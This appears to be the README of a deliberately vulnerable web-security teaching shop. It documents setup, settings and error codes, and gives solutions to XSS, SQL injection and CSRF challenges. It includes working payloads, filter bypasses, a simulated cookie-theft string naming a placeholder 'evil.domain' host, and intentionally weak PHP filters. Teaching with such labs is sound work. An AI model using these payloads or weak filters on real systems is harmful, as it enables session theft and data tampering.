# WebSec - Shop

This is a short summary of the most important points of the documentation for the WebSec Shop. The docker environment and the test environment (Vagrant) are described in separat README files. 

## Installation and Setup

1. Setup the docker environment with the ```setup_docker.sh``` script or follow the steps described in the docker README manually.
<br>
2. Login with the default admin user:
- **user** ```administrator```
- **password** ```dpbCpfcAqVHY3gYf```
3. Change the default password after your first login!
<br>
4. Choose your settings either in the admin area of the WebSec shop or edit them directly in the ```config/settings.json``` file. *(The difficulty of the challenges must be set **before** the first student logs in. Otherwise, every student has to reset their challenges in the menu manually in order to load the new challenge settings.)*
<br>
5. **Optional**: You can also create a user of your choice and later set the admin status via phpMyAdmin or the MySQL command line client:

- Connect to the MySQL database

```shell
$ docker exec -it <db_container_name> /bin/bash

$ mysql -u <dbUser> -p login
```

- The SQL query could look something like this:

```sql
UPDATE users SET is_admin = 1 WHERE user_name = <shopUser>;
``` 

## Project Structure
This is an overview over the files and directories directly related to the WebSec Shop. The structure is based on the [Standard PHP Package Skeleton](https://github.com/php-pds/skeleton).

The figure below shows the structure of the main directory **www/** and the purpose and contents of each subdirectory.
```
www/
├── bin/
│   └── command line tools
│
├── config/
│   └── php configuration files
│   └── shop settings file
│
├── data/
│   └── sqlite databases
│   └── user input files
│
├── docs/
│   └── short documentation
│
├── public/
│   └── admin/
│   │   └── pages for the admin area and global settings
│   │
│   └── assets/
│   │   └── CSS, JavaScript and images
│   │
│   └── pma/
│   │   └── access to phpMyAdmin (optional)
│   │
│   └── shop/
│   │   └── pages for the challenges
│   │
│   └── user/
│       └── pages for user settings
│
├── src/
│   └── includes/
│   │   └── include files
│   └── php functions
│
├── tests/
│   └── php unit tests (PHPUnit)
│
└── vendor
    └── dependencies (for PHPUnit)
```

### bin/

Contains the command line tools for this project.
- **```convert_md_to_html.sh```** Converts markdown files (like this one) to valid HTML for the **docs/** folder.
<br>
- **```get_docker_logs.sh```** Copies log files from the separat docker containers into the **bin/** folder.


### config/

Contains the configurations and settings for the shop.
- **```config.php```** Stores important constants for the project (server name, paths etc.). Is effected by the ```setup_docker.sh``` script.
<br>
- **```db_login.php```** Contains the login credentials for the login database. Is also setup by the ```setup_docker.sh``` script.
<br>
- **```db_shop.php```** Contains the login credentials for the shop database. Is also setup by the ```setup_docker.sh``` script.
<br>
- **```settings.json```** Stores all settings for the shop. For a more detailed description see the paragraph **Settings**.


### data/

Contains all user SQLite databases for the SQLi challenge and the user input JSON files.

On **normal** difficulty the databases are initialized with one table (users) that stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding student. The password that is displayed for the student is a random string.

On **hard** difficulty the databases are extended by a second table (premium_users) in which the premium user status is stored for every fake user and the student.

The databases are created during the registration process with the ```create_sqli_db``` function in **src/websec_functions.php**.

All user input related to the hacking challenges is stored in user specific JSON files, which are created when the user attempts a challenge for the first time. The user input in the JSON files is grouped by challenges.

### docs/

Contains the README files for all project components as HTML documents. The HTML files can be generated automatically with the ```convert_md_to_html.sh``` script in **bin/** from the original markdown files. 

### public/

This is the root directory for the apache web server. All files within this directory are accessible from the outside. The remaining files in **www/** must be explicitly loaded by a php file to be visible to the user.


The files for the registration and login system of the shop are directly located in the root directory.

The ```.htaccess``` file redirects the most common HTTP errors (400, 401, 402, 403, 404, 500) to custom error pages.

The **admin/** directory contains the restricted admin area. Here you can see and download the student results for the challenges, change global shop settings and access the phpMyAdmin site for the MySQL databases *(if enabled in the ```docker-compose.yml```)*.

The index file in the **pma/** directory checks if a user is either an admin user or has a valid token in order to redirect only authorized requests to the *"hidden"* phpMyAdmin directory. (*hidden* means in this context a random string as name for the phpMyAdmin directory).
This option is only relevant if phpMyAdmin and apache are installed in the same docker container. Otherwise, phpMyAdmin can be accessed via an open port. For more information on this, see the docker README.

All pages related to the shop system and the hacking challenges are located in the **shop/** directory.

The pages for the user settings and the local challenge settings are in the **user/** directory.

All assets files like JavaScript, CSS or images are stored in the **assets/** directory. Third party JavaScript or CSS files are stored separately in directories named 'vendor'.

### src/

The **src/** directory contains all php functions relevant to the shop and the challenges. Depending on their domain, the functions are stored in different files each denoted with an appropriate prefix (```*_functions.php```).

The **includes/** directory includes various files; mainly repetitive content that is later loaded in by other php scripts. The files are separated in different groups by their prefixes.

### tests/

Contains the [PHPUnit](https://phpunit.de/) tests. This directory can be omitted in production.


### vendor/

All dependencies for the project are stored in this directory. Currently, only the PHPUnit module has any dependencies. Hence, this directory can also be omitted in production.


## Settings

The ```settings.json``` file stores all settings for the hacking platform. The (recommended) default settings are stored in the ```settings.backup``` file. Settings can either be changed directly in the JSON file or in the admin area of the shop. All settings and their effects are documented below:

- **login**: enables or disables the login page and replaces it with an appropriate error page. Expects either *true* or *false* as value.
<br>
- **registration**: enables or disables the registration page and replaces it with an appropriate error page. Expects either *true* or *false* as value.
<br>
- **difficulty**: sets the difficulty level for the challenges. There is at the moment only a 'hard' and a 'normal' level. Expects either *true* (hard) or *false* (normal) as value.
<br>
- **badge_links**: links to external resources (e.g. Learnweb) for the hacking challenges. The links only come into effect, if a challenge has not been solved yet. Otherwise, the badges are automatically redirecting to the scoreboard. Every link has to start with *https* or *http*.
<br>
- **domains**: list of all allowed domains for the registration process. By default, only WWU mail addresses are allowed. Expects an array of string values.
<br>
- **usernames**: list of all forbidden user names for the registration process. By default, all names that are used as fake user names in the challenges are forbidden to avoid confusion. Expects an array of string values.
<br>
- **learnweb**: link to the current WebSec Learnweb course. The link has to start with *https* or *http*.

## Challenges

This is a short summary of the hacking challenges in the WebSec Shop and their solutions.

### Cross Site Scripting (Reflective)

The reflective XSS challenge is located in the ```overview.php``` file.

**Challenge**: The challenge is to abuse the product search field to read out the users own session ID that is stored in a cookie (XSS_YOUR_SESSION). The challenge is completed, if the user enters the cookie in the corresponding popup field.

The cookie is automatically generated during the user registration process and later set after the user logs in. The cookie is destroyed after the session ends and the user logs out.
The popup containing the field to enter the solution is automatically shown to the user after a JavaScript dialog (`alert()`, `confirm()` or `prompt()`) has been used on the product search page. To achieve this, a script overrides every dialog with a custom function. The custom function displays the original dialog (the users XSS attack) followed by the popup to enter the cookie.

```js
// temporarily override alert()
// there are also variants for confirm() and prompt()
(function () {

    var _alertXSS = window.alert;

    window.alert = function () {

        // show the original alert content
        _alertXSS.apply(window, arguments);

        // show the popup to enter the solution
        $('#xss-solution').modal('show');
    };
})();
```

**Solution**: Since the search term is printed out to the page, a solution would be to use a JavaScript dialog to output the cookie property of the document. JavaScript code can be executed by adding `<script>` tags to the search term. A working example would look like this:

```html
<!-- could also be confirm(document.cookie) or prompt(document.cookie) -->
<script>alert(document.cookie);</script>
```

Another approach would be to write the cookie directly to the page.

```html
<script>document.write(document.cookie)</script>
```

*If the attack is not performed via a JavaScript dialog function, the user has the option to trigger the popup mentioned above manually. A button and a short self-explanatory text is shown, when the search field is used and the search term contains `document.cookie`.*

**Difficulty**: On hard difficulty the search term is filtered for `<script>` tags: 

```php
if ($difficulty == "hard") {
    // filter all '<script>' tags (case insensitive)
    $rawSearchTerm = str_ireplace("<script>", "", $rawSearchTerm);

    /*
    * Alternative: filter only '<script>' and '<SCRIPT>' tags
    * str_replace("<script>","", $rawSearchTerm)
    * str_replace("<SCRIPT>","", $rawSearchTerm)
    * Solution for all browsers: <ScRiPt>alert(document.cookie)</ScRiPt>
    */
}
```

The user has to circumvent this measure by using a different HTML tag that allows the execution of JavaScript. An example that works with all modern browsers would be the `<img>` tag:

```html
<img src="" onerror=javascript:alert(document.cookie)>
```

### Cross Site Scripting (Stored)

The stored XSS challenge is located in the ```product.php``` file.

**Challenge**: In this challenge the user has to exploit a comment field on the product page. *(The product page and the comment section are identical for all products. Only the product information changes based on the `GET` variable in the URL.)* The comments are stored in a MySQL database. The task is to simulate a cookie stealing attack by showing a JavaScript dialog with the content ```'evil.domain/cookie.php?c=' + document.cookie```. The challenge is completed, when the user *steals* a session of a fake user and adds a specific product to the shopping cart.

If the user enters the payload, the JavaScript dialog functions are overwritten and the content is send via AJAX Request to the file `post_handler.php`.

```js
// override alert()
// there are also variants for confirm() and prompt()
window.alert = function (message) {

    var request;

    request = $.post("post_handler.php", {
        storedXSSMessage: message
    });
    request.done(function (response) {
        showSuccess(message, response);
    });
    request.fail(function (response) {
        showError(message, response);
    });
};
```

The message is validated by checking if it contains at least the elements 'evil', 'domain', 'cookie' and 'document.cookie' in any given order. After that, the user is shown a success or error message.

The success message is a JavaScript `confirm()` dialog that gives the user the option to *steal* the session of a fake user. In order to simulate this, a second cookie is set that triggers a 'Welcome Back, *fake user*' popup and a function call to fill the shopping cart with a variety of products.
The `check_stored_xss_challenge()` function is always called when the shop header is loaded on a page and checks if a certain product is added to the cart in order to successfully complete this challenge.

**Solution**: To solve this challenge, the user has to display the payload on the product page. This could be done like this:

```html
<script>alert('evil.domain/cookie.php?c=' + document.cookie);</script>
```

**Difficulty**: On hard difficulty the `<script>` tags and the `alert()` function are filtered before a user comment is stored to the database. 

```php
if ($difficulty == "hard") {

    // filter all '<script>' tags (case insensitive)
    $filteredComment = str_ireplace("<script>", "", $_POST['userComment']);

    /*
    * Alternative: filter only '<script>' and '<SCRIPT>' tags
    * str_replace("<script>","", $rawSearchTerm)
    * str_replace("<SCRIPT>","", $rawSearchTerm)
    * Solution for all browsers: <ScRiPt>alert(document.cookie<ScRiPt>
    */

    // additionally filter 'alert' command
    $filteredComment = str_replace("alert", "", $filteredComment);

    // add filtered comment to database
    add_comment_to_db($filteredComment, $_SESSION['userName']);
}
```

To circumvent this restrictions, the user can rely an a different HTML tag like `<img>` and use another JavaScript dialog function like `confirm()`.

```html
<img src="" onerror=javascript:confirm('evil.domain/cookie.php?c=' + document)>
```

The user could also use the `document.write` function.

### SQL Injection

The SQLi challenge is located in the `friends.php` file.

**Challenge**: In this challenge the user should exploit a search field and a SQLite database. The task is to upgrade the user account to a premium membership.

The search field queries the 'users' table of the SQLite database which stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding user.

```sql
SELECT username, email, wishlist FROM users WHERE username = '<search>';
```

**Solution**: To solve this challenge the user needs to inject a SQL query that updates the users premium status in the database. An example could look like this:

```sql
'; UPDATE users SET user_status = 'premium' WHERE username = '<user>';--
```

The `';` closes off the original SELECT query. The `--` at the end comments out all remaining parts of the initial query.

**Difficulty**: On hard difficulty the premium status is no longer stored directly in the users table but in a separat table. To find this table, the user needs to query the sqlite_master table.

```sql
'; SELECT * FROM sqlite_master;--
```

Furthermore, the input length for the search field is limited by the HTML attribute `maxlength`. The user has to manually increase this limit to enter SQL statements longer than 10 characters.

```html
<input maxlength="10">
```

### Cross Site Request Forgery

The CSRF challenge is located in the `contact.php` file.

**Challenge**: In this challenge the user should send a support request to the closed contact form. In addition, the request should look like it was send by the fake user 'Elliot'.

**Solution**: This challenge can be solved in three different ways. The easiest option is to manipulate the product comment form on ```product.php``` with the browser inspector to include the same input names as the closed contact form.

The product comment field could also be manipulated with JavaScript:

```html
<script>
var frm = document.getElementById('CSRForm');
frm.action = "contact.php";
document.getElementById('challengeUsername').value="elliot";
document.getElementById('challengePost').name="userPost";
</script>
```

Another way to solve this challenge would be to send an AJAX request via one of the fields that are vulnerable to XSS attacks:

```html
<script>
const xhr = new XMLHttpRequest();
xhr.open("POST", "contact.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("uname=elliot&userPost=pwned");
</script>
```

**Difficulty**: On hard difficulty the user needs to send a user specific token with the support request. This token can be obtained for the user Elliot from the SQLite database during the SQLi challenge.

```html
<ScRiPt>
const xhr = new XMLHttpRequest();
xhr.open("POST", "contact.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("uname=elliot&userPost=pwned&utoken=<token>");
</ScRiPt>
```


## Error Codes

All exceptions and errors have a corresponding error code. In the following section, all these codes are listed and explained. Hints and/or known solutions can also be added in this part. 

**010**: A PDO exception occurred during the connection attempt to the **login** database.
- Database credentials are wrong *(either in ```config/config.php``` or in the ```.env``` file for the docker containers)*
- The MySQL docker container is not running *(```docker ps | grep "db_login"```)*
- The MySQL docker container needs at least 1 minute after start up to accept any connection attempts.

**020**: A PDO exception occurred during the connection attempt to the **shop** database.
- Database credentials are wrong *(either in ```config/config.php``` or in the ```.env``` file for the docker containers)*
- The MySQL docker container is not running *(```docker ps | grep "db_shop"```)*
- The MySQL docker container needs at least 1 minute after start up to accept any connection attempts.

**03x**: The hash creation with the php function ```password_hash()``` failed to produce a hashed value for the given input.
- **031**: Error during registration process in ```function do_registration```
- **032**: Error during password reset request creation in ```function add_pwd_request```
- **033**: Error during password change process in ```function change_pwd```
- **034**: Error during password reset process in ```function set_new_pwd```
- All errors above could occur if the given input is empty **or** ```password_hash()``` has an internal error of its own (unlikely).

**04x**: Corrupted database state :bug:
- **041**: There is more than one entry for a single username in the login database. Indicates a bigger bug in the user registration system, since input is filtered for duplicates at multiple points. Start here: ```function check_user_exists```
- **042**: There is more than one valid request in the resetPwd table. This should not happen, since any old request for a mail address should be deleted in ```function do_pwd_reset``` with ```function delete_pwd_request```

**05x**: SQLite Errors
- **051**: SQLite database could not be created. Check ```function create_sqli_db```
- **052**: The SQLite database could not be reset by the user. Check ```function create_sqli_db```
- **053**: Users could not be added to the SQLite database. Check ```function create_sqli_db```
- **054**: The SQLite database could not be queried by the user. Check ```function query_sqli_db```
- **055**: UPDATE or INSERT query written by the user could not be processed in the SQLite database. Check ```function query_sqli_db```
- **056**: SELECT query could not be processed by the SQLite database. Check ```function query_sqli_db```
- **057**: Status of the SQLi challenge could not be check in the SQLite database. See ```function check_sqli_challenge```
- **058**: SQLite database does not exist for this user.

**06x**: AJAX Errors
**061**: The $.post request in ```stored_xss.js``` failed. Either the form handler was moved or the user found a way to break the JavaScript.

**07x**: JSON Errors
- **071**: The ```settings.json``` could not be opened.
- **072**: The JSON file for the user challenge input could not be opened/found. See ```function write_to_challenge_json```
- **073**: Could not write to a specific section of the challenge JSON file. See ```function write_to_challenge_json```
- **074**: Could not write the challenge JSON file to disk. See ```function write_to_challenge_json```

**1xx**: A SQL query could not be processed by the login or shop database.

```php
$whichDB = (100 <= $errorCode < 150) ? 'Login_DB' : 'Shop_DB';
```

- **101**: User e-mail could not be fetched from the resetPwd table. See query in ```function get_user_mail```
- **102**: See queries in ```function try_registration```
- **103**: See query in ```function try_login```
- **104**: The insertion of a new user in the database failed. See query in ```function do_registration```
- **105**: Could not query the database for a given user e-mail address. See query in ```function check_pwd_request_status```
- **106**: Delete query in ```function delete_pwd_request``` cloud not be performed
- **107**: Password reset request could not be inserted into the resetPwd table. See query in ```function add_pwd_request```
- **108**: Old user password could not be retrieved from the users table. See query in ```function change_password```
- **109**: User password could not be updated in the users table. See query in ```function change_password``` 
- **110**: User password could not be updated in the users table. See query in ```function set_new_pwd```
- **111**: Selector token and expiration date could not be fetched from the database. See query in ```function verify_token```
- **112**: The XSS cookie could not be set. See the query in ```function set_fake_cookie```
- **113**: The Challenge cookie could not be reset by the user. See query in ```function reset_reflective_xss_db```
- **114**: The CSRF entries for a user could not be deleted from the database. See query in ```function reset_csrf_db```
- **115**: The fake cookie could not be fetched from the users table. See query in ```function check_reflective_xss_challenge```
- **116**: The XSS Comment could not be fetched from the databse. See query in ```function check_reflective_xss_challenge```
- **117**: The CSRF posts could not be fetched from the databse. See query in ```function check_crosspost_challenge```
- **118**: The CSRF referrer could not be fetched from the databse. See query in ```function check_crosspost_challenge_double```
- **119**: The XSS challenge cookie could not be inserted into the database during registration. See query in ```function do_registration```. Is there already an entry for that particular user name?
- **120**: The user could not be unlocked. See query in ```function unlock_user```
- **121**: The user cookies could not be fetched from the database. See query in ```function set_user_cookies```
- **122**: The challenge status row for the new user could not be inserted into the database. See query in ```function do_registration```
- **123**: The user cookies could not be fetched from the database. See query in ```function check_reflective_xss_challenge```
- **124**: The challenge status could not be updated. See query in ```function set_challenge_status```
- **125**: The challenge status could not be fetched. See query in ```function lookup_challenge_status```
- **126**: A username is used in either the challengeStatus table or the fakeCookie table without corresponding entry in the users table. This could happen if a user is manually deleted from the users table without deleting it from the two tables mentioned above.
- **127**: The ```last_login``` could not be fetched from the database for the default administrator user.
- **128**: Username could not be fetched from the login database based on the given mail address in ```get_user_name```
---
- **151**: Quantity of product in the database could not be fetched. See query in ```function add_product_to_cart```
- **152**: Existing product could not be added to the cart. See query in ```function add_product_to_cart```
- **153**: New product could not be added to the cart. See query in ```function add_product_to_cart```
- **154**: Check if a product type is already in the cart failed. See query in ```function is_product_in_cart```
- **155**: Products from the Product Database could not be fetched. See query in ```function show_products```
- **156**: Cart content could not be displayed. See query in ```function show_cart_content```
- **157**: Product details could not be loaded from the database. See query in ```function show_cart_content```
- **158**: Check if cart is empty could not be performed. See query in ```function is_cart_empty```
- **159**: The number of cart items could not be returned. See query in ```function get_num_of_cart_items```
- **160**: The product search results could not be displayed. See query in ```function show_search_results```
- **161**: Product comment could not be added to the database. See query in ```function add_comment_to_db```
- **162**: Product comment could not be fetched from the database. See query in ```function check_user_comment_exists```
- **163**: Product comment could not be deleted. See query in ```check_user_comment_exists```
- **164**: Cart could not be emptied. See query in ```empty_cart```
- **165**: Fake products could not be added to the cart. See query in ```update_cart```
- **166**: Crosspost table could not be accessed. 
- **167**: Entry could not be added to the Crosspost table.
- **168**: Product data could not be loaded from the database.
- **169**: User Solution could not be written to the shop db. See query in ```save_challenge_solution```
- **170**: User Solution could not be read from the shop db. See query in ```get_challenge_solution```

## Adding New Challenges

If you add new challenges to the shop, please consider the following points in order to keep the project consistent:

- New challenges should be added on separat pages
- A challenge page should be stored in **public/shop/**
- All challenge related functions should be stored in `websec_functions.php`
- Increase the number of challenges in `config.php`
- A reset functionality for the new challenge must also be added.

## Naming Conventions

The following naming conventions should be used throughout the project.

**Variables**: ```variableName```

**Constants**: ```CONSTANT_NAME```

**Methods / Functions**: ```method_name```

**CSS Classes**: ```class-name```

**CSS IDs**: ```idName```

**HTML Fields etc.**: ```field-name```

**DB Fields**: ```[table]_field_name```

**PHP Files**: ```file_name.php```

**Other (Asset) Files**: ```file_name.ending```
